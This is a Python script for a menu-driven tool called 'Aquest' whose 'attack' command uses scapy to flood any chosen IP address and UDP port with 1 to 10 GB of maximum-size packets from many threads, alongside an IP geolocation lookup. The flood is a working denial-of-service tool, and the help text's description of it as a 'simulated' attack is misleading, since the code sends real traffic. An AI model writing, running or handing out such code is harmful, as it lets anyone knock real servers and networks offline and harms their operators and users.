import os
import sys
import subprocess
from threading import Thread
import time

# List of required packages
required_packages = ["scapy", "requests", "colorama"]

# Function to check and install missing packages
def check_and_install_packages():
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)

    if missing_packages:
        print("\nThe following packages are missing:")
        for pkg in missing_packages:
            print(f" - {pkg}")
        install = input("\nDo you want to install them now? (y/n): ").strip().lower()
        if install == "y":
            for pkg in missing_packages:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])
            print("\nAll packages have been installed. Restarting the script...")
            os.execl(sys.executable, sys.executable, *sys.argv)
        else:
            print("\nExiting. Please install the required packages and try again.")
            sys.exit()

# Run the check before importing other modules
check_and_install_packages()

from scapy.all import *
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Constants
PAYLOAD_SIZE = 65500  # Maximum payload size for UDP (close to MTU)
BATCH_SIZE = 1000     # Number of packets to send in a single batch

# Function to create a typing effect
def print_typing(text, color=Fore.WHITE, delay=0.02):
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print()

# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to display the Karma-like banner
def display_banner():
    print(Fore.BLUE + "┌──────────────────────────────────────────┐")
    print(Fore.BLUE + "│" + Fore.WHITE + "  Welcome To The Main Screen Of Aquest   " + Fore.BLUE + " │")
    print(Fore.BLUE + "│" + Fore.WHITE + "  Type [help] to see the Commands         " + Fore.BLUE + "│")
    print(Fore.BLUE + "│" + Fore.WHITE + "  Dev - Aquestria           " + Fore.BLUE + "              │")
    print(Fore.BLUE + "└──────────────────────────────────────────┘")

# Function to return to main menu and clear screen
def return_to_main():
    clear_screen()
    display_banner()
    main_menu()

# Function to send packets in batches
def send_batch(target_ip, target_port, payload, num_packets):
    packets = [IP(dst=target_ip)/UDP(dport=target_port)/payload for _ in range(num_packets)]
    send(packets, verbose=0)

# Function to send packets
def send_packets(target_ip, target_port, data_size):
    total_bytes = {
        "1": 1 * 1024 * 1024 * 1024,
        "2": 5 * 1024 * 1024 * 1024,
        "3": 10 * 1024 * 1024 * 1024
    }.get(data_size)

    if not total_bytes:
        print(Fore.RED + "Invalid data size selected.")
        return

    num_packets = total_bytes // PAYLOAD_SIZE
    print(Fore.BLUE + f"Sending {int(total_bytes / (1024 * 1024 * 1024))}GB of data ({total_bytes} bytes) in {num_packets} packets...")

    payload = b"X" * PAYLOAD_SIZE
    threads = [Thread(target=send_batch, args=(target_ip, target_port, payload, BATCH_SIZE)) for _ in range(num_packets // BATCH_SIZE)]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    print(Fore.WHITE + "Finished sending data.")

# Function to get IP geolocation
def get_ip_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data["status"] == "success":
            print(Fore.BLUE + "\nIP Geolocation Information:")
            for key, value in data.items():
                print(Fore.WHITE + f"{key.capitalize()}: {value}")
        else:
            print(Fore.RED + "Failed to retrieve geolocation data.")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

# Menu functions
def ip_attack():
    while True:
        target_ip = input(Fore.BLUE + "Enter the target IP address (or type 'back'): ").strip()
        if target_ip.lower() == "back":
            return_to_main()
            return
        target_port = input(Fore.BLUE + "Enter the target UDP port (or type 'back'): ").strip()
        if target_port.lower() == "back":
            return_to_main()
            return

        try:
            target_port = int(target_port)
            data_size = input(Fore.WHITE + "Enter data size (1GB=1, 5GB=2, 10GB=3) or 'back': ").strip()
            if data_size.lower() == "back":
                return_to_main()
                return
            send_packets(target_ip, target_port, data_size)
        except ValueError:
            print_typing("Invalid input. Please try again.", Fore.RED)

def ip_geo():
    while True:
        target_ip = input(Fore.BLUE + "Enter the IP address to locate (or type 'back'): ").strip()
        if target_ip.lower() == "back":
            return_to_main()
            return
        get_ip_geolocation(target_ip)

def credits():
    print_typing("\n=== CREDITS ===", Fore.BLUE)
    print(Fore.WHITE + "Developed by Aquestria\n")

# Function to handle the main menu
def main_menu():
    while True:
        print(Fore.BLUE + "╔═══[root@Aquest]")
        user_input = input(Fore.BLUE + "╚══> " + Fore.RESET).strip().lower()

        if user_input == "help":
            print_typing("\nAvailable Commands:\n", Fore.BLUE)
            print(Fore.WHITE + "1. attack  - Launch a simulated IP attack")
            print(Fore.WHITE + "2. geo     - Get IP Geolocation")
            print(Fore.WHITE + "3. credits - View credits")
            print(Fore.WHITE + "4. exit    - Exit the program\n")

        elif user_input == "attack":
            ip_attack()

        elif user_input == "geo":
            ip_geo()

        elif user_input == "credits":
            credits()

        elif user_input == "back":  # Ensuring "back" works in main menu too
            return_to_main()

        elif user_input == "exit":
            print_typing("\nExiting... Goodbye!", Fore.RED)
            sys.exit()

        else:
            print_typing("Invalid command. Type 'help' for a list of commands.", Fore.RED)

# Main function
def main():
    clear_screen()
    display_banner()
    main_menu()

# Entry point of the script
if __name__ == "__main__":
    main()
